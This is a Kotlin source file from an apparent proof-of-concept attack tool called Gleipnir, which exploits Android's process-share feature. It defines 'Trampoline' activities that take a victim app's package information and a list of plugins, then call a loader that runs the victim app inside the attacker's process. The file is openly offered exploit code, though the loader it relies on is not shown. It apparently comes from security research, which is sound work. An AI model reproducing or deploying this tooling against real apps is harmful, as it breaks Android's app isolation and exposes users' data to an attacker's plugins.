/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app

import android.app.Activity
import android.content.pm.PackageInfo
import android.os.Bundle
import org.gleipnir.app.extendableLoader.GleipnirLoader
import org.gleipnir.app.extendableLoader.IPlugin

/**
 * The Activity Trampoline.
 *
 * This Activity (it's implementations Trampoline1, Trampoline2, ...) will be
 * started first in the brand new process when a new Attack will be launched.
 * It calls the GleipnirLoader.loadAndStartAsync(..) function who will load and start the victim app.
 *
 * @param TARGET_APPLICATION the PackageInfo of the victim App.
 */
open class Trampoline : Activity() {

    companion object {
        const val EXTRA_PROFILE = "extra_profile"
        const val TARGET_APPLICATION = "TARGET_APPLICATION"
        const val PLUGINS = "PLUGINS"
        var currentTrampoline: Trampoline? = null
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        currentTrampoline = this
        setContentView(R.layout.trampoline_layout)
        val targetApplication = intent.getParcelableExtra(TARGET_APPLICATION) as PackageInfo?
        val plugins = intent.getSerializableExtra(PLUGINS) as List<IPlugin>?
        val profile = intent.extras?.getString(EXTRA_PROFILE) ?: ""

        targetApplication?.let {
            launch(it, plugins, profile)
        }
    }

    /**
     * Launch the App represented by the given packageInfo.
     *
     * @param packageInfo the App to be started
     * @param plugins the plugins to be used
     * @param profile the plugins to be used
     */
    fun launch(packageInfo: PackageInfo, plugins: List<IPlugin>?, profile: String) {
        val pluginsToUse = plugins ?: arrayListOf()
        GleipnirLoader.loadAndStartAsync(
            this@Trampoline,
            pluginsToUse,
            packageInfo,
            profile
        ) {
            //this@Trampoline.finish()
        }
    }

}

/**
 * The trampolines for each running victim App
 */
class Trampoline1 : Trampoline()
class Trampoline2 : Trampoline()
class Trampoline3 : Trampoline()
class Trampoline4 : Trampoline()
class Trampoline5 : Trampoline()
class Trampoline6 : Trampoline()